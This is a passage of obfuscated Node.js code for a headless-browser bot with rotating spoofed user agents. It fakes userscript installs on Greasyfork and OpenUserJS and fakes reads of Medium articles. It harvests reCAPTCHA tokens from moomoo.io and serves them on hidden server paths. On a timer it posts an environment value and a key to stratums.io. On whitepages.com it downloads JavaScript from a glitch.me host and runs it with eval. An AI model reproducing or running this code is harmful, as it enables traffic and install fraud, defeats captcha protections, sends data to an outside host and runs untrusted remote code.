      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a1(0x2) + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + a1(0x21) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + a1(0x3) + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + a3(0x1c) + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + a3(0x12) + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xa4f + -0x998 + -0x1 * -0x13e7
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x18 * 0xaa + 0x4 * 0x795 + -0xe64)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x19d + -0x4af * 0x8 + 0x7e5 * 0x5), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xd * -0x271 + 0x659 + 0xc1 * -0x32), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x4 * 0x1eb + 0xa * -0x307 + 0x169a;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x2 * 0xdab + 0x5f9 * -0x1 + -0x71f * 0x3; w < getRandomInt(-0x359 * 0x2 + -0x3 * -0x3a5 + -0x21e * 0x2, -0x3 * 0x85d + 0x1966 + 0x2 * -0x25); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x5a22 + -0x8986 + -0xe704 * -0x2);
        }
      }();
    }, 0xbbb + -0x19d6 + 0xe7f), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x814 * -0x4 + 0x87 * 0x22 + -0x323e;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x17b5 + -0x592 + -0x1223, 0xc * 0x17b + 0x37 * 0x47 + 0xaf1 * -0x3)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xd5 * 0xff + 0x53d0 + 0xf58b);
    }, 0x19 * 0x6 + -0x165f + 0x162d), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1 * 0x20e3 + 0x1492 * -0x1 + 0x325 * 0x11;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1f66 * 0x1 + 0x12a9 + -0x827 * -0x3), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x3 * -0x166 + 0x1168 + -0xd36), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x7c9 * -0x8e + 0x1f5dd * 0x2 + -0x25ae6 * -0x6);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x2070 * -0x1 + 0x1667 * -0x1 + 0x1 * -0x9a5);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1174 + 0x2617 * 0x1 + -0x1 * 0x36c3);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x2609 + 0xbc * -0x37 + -0x1 * -0x21eb);
}
doFlags['doOUJS'] && ((async () => {
  const a6 = c,
    a5 = d,
    a4 = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x527 * -0x5 + -0x2349 + 0x3d0d) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * 0xb3c + 0x1acb + 0xb * -0x16a));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1d6e * 0x1 + 0x21a5 + 0x1 * -0x437, D['indexOf']('\x20'));
        return B ? E['slice'](-0x45d * -0x3 + 0x5c * 0x44 + 0x1 * -0x2587, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x23ab + 0x3ccb + -0x1 * -0xdf0),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1972 + 0x13 * -0xad + -0x1 * -0x1a75),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + a4(0x17, 'DMIL') + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + a5(0x14) + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      a6(0xc) + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
